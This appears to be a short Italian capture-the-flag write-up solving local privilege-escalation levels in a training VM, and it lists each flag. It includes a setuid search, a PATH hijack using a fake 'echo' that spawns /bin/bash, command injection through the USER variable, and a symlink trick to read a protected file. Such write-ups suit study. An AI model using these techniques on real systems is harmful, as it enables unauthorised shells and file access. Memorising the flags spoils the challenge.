# BootsTrap
Appena si avvia la vm con l'iso compare la flag: `CCIT{72318565-c76d-4ed9-81b6-afc582e75777}`

# SetUID
```bash
find / -perm /u+s 2>/dev/null    # elimina le righe che ritornano autorizzazione negata.
/usr/share/nano/fishy            # Accesso a shell con autorizzazione dell'user flag01.
```
`CCIT{997874cf-581a-49ca-a449-51d24dd31fa5}`

# Arbitrary Command Exec
```bash
system("usr/bin/env echo ..."); 
```
Seguito dal nome di un programma esegue quel programma, quello sarebbe equivalente a bin/echo, in sostanza  cerca il primo eseguibile 
'echo' nelle directory configurate della PATH.

Si va su level01, si crea un file C echo.c:
```c
int main() { 
  system("/bin/bash"); 
}
```
```bash
gcc -o echo echo.c   # Cosi da avere l'eseguibile echo personalizzato.
```
Si procede a modificare la PATH:
```bash
export PATH=/home/level00:$PATH   # Cosi è la prima che viene letta, e con ./flag01 si ottiene la shell di flag01.
```
`CCIT{0fc0a412-4184-4c9d-af48-498f7bc713db}`


# Arbitrary Command Exec 2

Si ragiona nello stesso modo, soltando con USER, se proviamo:
```bash
export USER=poop   # ./flag02 -> poop is cool.
```
Ora serve solo concatenare piu istruzioni ad USER con ';'
```bash
export USER="poop; /bin/bash #"; ./flag02   # Ottengo la shell di flag02.
```
`CCIT{b5b43a28-962d-42ea-92b6-cefa552766a0}`

# Exit VIM
```
Basta usare i comandi :Sex, :./myvi -> Appare FlAg.TxT, CCIT{c1cd2007-55bb-4a40-9f91-21f5e2207db1}
```

# Read flag
Creare un symlinks: 
```bash
ln -s /home/flag04/flag.txt /home/level04/file.txt; ./flag04 /home/level04/file.txt.
```
`CCIT{4c886115-a6ca-4141-b0a2-69a25cadceaf}`
